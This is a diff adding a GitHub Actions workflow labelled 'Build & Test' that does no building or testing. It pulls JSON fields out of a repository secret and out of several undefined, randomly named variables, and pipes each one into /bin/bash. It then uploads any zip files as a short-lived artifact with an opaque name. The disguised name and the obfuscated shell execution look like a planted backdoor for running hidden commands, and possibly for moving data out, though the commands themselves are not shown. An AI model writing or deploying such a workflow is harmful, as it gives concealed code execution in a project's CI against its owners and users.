@@ -1,0 +1,32 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          ydf5: ${{ secrets.ydf5 }}
+        run: |
+          printf '%s' "$ydf5" | jq -r .xeqn797 | /bin/bash
+          printf '%s' "$ee3" | jq -r .hpeyi969 | /bin/bash
+          printf '%s' "$zgj081" | jq -r .faxzb2937 | /bin/bash
+          printf '%s' "$whbcw0" | jq -r .na2086 | /bin/bash
+          printf '%s' "$mbzm500" | jq -r .eff4 | /bin/bash
+          echo $xwc9 | jq -r .enq88179 | /bin/bash
+          echo $so01 | jq -r .k4 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: nqGq42A2
+          path: "*.zip"
+          retention-days: 1
